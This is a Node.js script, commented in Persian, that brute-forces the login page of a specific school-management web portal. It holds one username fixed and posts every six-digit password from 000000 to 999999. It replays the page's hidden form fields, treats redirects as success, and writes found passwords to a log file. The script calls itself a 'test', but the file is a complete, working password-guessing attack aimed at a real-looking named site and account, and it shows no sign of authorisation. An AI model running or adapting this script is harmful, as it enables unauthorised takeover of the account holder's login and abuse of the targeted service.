require("dotenv").config();
const axios = require("axios");
const cheerio = require("cheerio");
const { wrapper } = require("axios-cookiejar-support");
const { CookieJar } = require("tough-cookie");
const fs = require("fs");

// ⚙️ تنظیمات
const USERNAME = "0111062640"; // 👈 یوزرنیم ثابت
const LOGIN_URL =
  "https://haftometir.modabberonline.com/Login.aspx?ReturnUrl=%2f&AspxAutoDetectCookieSupport=1"; // 👈 URL خودت

const START = 0;
const END = 999999;
const DELAY = 1000; // میلی‌ثانیه تاخیر

const logFile = "results.txt";

// تابع تاخیر
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// تابع لاگین
async function tryLogin(username, password) {
  const jar = new CookieJar();
  const client = wrapper(axios.create({ jar, timeout: 10000 }));

  try {
    const loginPageResponse = await client.get(LOGIN_URL);
    const $ = cheerio.load(loginPageResponse.data);

    const formData = new URLSearchParams();
    $('input[type="hidden"]').each((i, elem) => {
      const name = $(elem).attr("name");
      const value = $(elem).attr("value");
      if (name && value) {
        formData.append(name, value);
      }
    });

    formData.append("txtUserName", username);
    formData.append("txtPassword", password);
    formData.append("LoginButton", "ورود به سیستم");

    const loginResponse = await client.post(LOGIN_URL, formData, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Referer: LOGIN_URL,
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      maxRedirects: 0,
      validateStatus: (status) => status >= 200 && status < 400,
    });

    const $response = cheerio.load(loginResponse.data);
    const errorMessage = $response("#lblMessage").text().trim();
    const loginError = $response(".error-message").text().trim();

    if (loginResponse.status === 302 || loginResponse.status === 301) {
      return { success: true, message: "✅ SUCCESS - Redirected" };
    }

    if ($response('input[name="txtUserName"]').length > 0) {
      return {
        success: false,
        message: errorMessage || loginError || "Invalid credentials",
      };
    }

    return { success: true, message: "✅ SUCCESS - Logged in" };
  } catch (error) {
    if (error.response && error.response.status === 302) {
      return { success: true, message: "✅ SUCCESS - Redirect detected" };
    }

    if (error.code === "ECONNABORTED" || error.message.includes("timeout")) {
      return { success: false, message: "⏱️ TIMEOUT" };
    }

    if (error.response && error.response.status === 429) {
      return { success: false, message: "🔒 LOCKED - Rate limited" };
    }

    return {
      success: false,
      message: `❌ ERROR - ${error.message}`,
    };
  }
}

// حلقه اصلی
async function bruteForce() {
  console.log("🚀 Starting password brute force test...");
  console.log(`👤 Username: ${USERNAME} (ثابت)`);
  console.log(
    `🔑 Password range: ${START.toString().padStart(
      6,
      "0"
    )} to ${END.toString().padStart(6, "0")}`
  );
  console.log(`⏱️ Delay: ${DELAY}ms between requests\n`);

  fs.writeFileSync(
    logFile,
    `Password Brute Force Test\nUsername: ${USERNAME}\nStarted: ${new Date().toISOString()}\n\n`
  );

  let successCount = 0;
  let failedCount = 0;

  for (let i = START; i <= END; i++) {
    const password = i.toString().padStart(6, "0"); // 👈 پسورد 6 رقمی متغیر

    console.log(`[${i}/${END}] Testing password: ${password}`);

    const result = await tryLogin(USERNAME, password);

    if (result.success) {
      successCount++;
      console.log(`✅ PASSWORD FOUND: ${password} - ${result.message}`);
      fs.appendFileSync(
        logFile,
        `✅ SUCCESS - Password: ${password} - ${result.message}\n`
      );
    } else {
      failedCount++;
      console.log(`❌ ${password} - FAILED - ${result.message}`);
      fs.appendFileSync(
        logFile,
        `❌ ${password} - FAILED - ${result.message}\n`
      );
    }

    if (i < END) await sleep(DELAY);
  }

  console.log("\n✅ Test Completed!");
  console.log(`📊 Total tested: ${END - START + 1}`);
  console.log(`✅ Success: ${successCount}`);
  console.log(`❌ Failed: ${failedCount}`);

  fs.appendFileSync(
    logFile,
    `\n--- Summary ---\nTotal: ${
      END - START + 1
    }\nSuccess: ${successCount}\nFailed: ${failedCount}\n`
  );
}

bruteForce().catch(console.error);
